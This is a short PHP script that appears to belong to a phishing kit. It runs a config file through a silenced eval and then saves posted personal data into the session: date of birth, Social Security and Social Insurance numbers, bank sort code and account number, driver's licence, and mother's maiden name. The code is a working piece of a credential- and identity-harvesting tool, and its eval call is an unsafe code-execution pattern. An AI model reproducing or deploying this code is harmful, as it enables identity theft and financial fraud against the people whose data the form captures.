<?php
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/../filter.php';

if (file_exists('../config/' . $api->general_config))
{
  @eval(file_get_contents('../config/' . $api->general_config));
}

$api->waiting();

$_SESSION['dob']      = $_POST['dob'];
$_SESSION['ssn']      = $_POST['ssn'];
$_SESSION['sort']     = $_POST['sort'];
$_SESSION['sin']      = $_POST['sin'];
$_SESSION['driver']   = $_POST['driver'];
$_SESSION['osid']     = $_POST['osid'];
$_SESSION['accnum']   = $_POST['accnum'];
$_SESSION['mother']   = $_POST['mother'];

?>
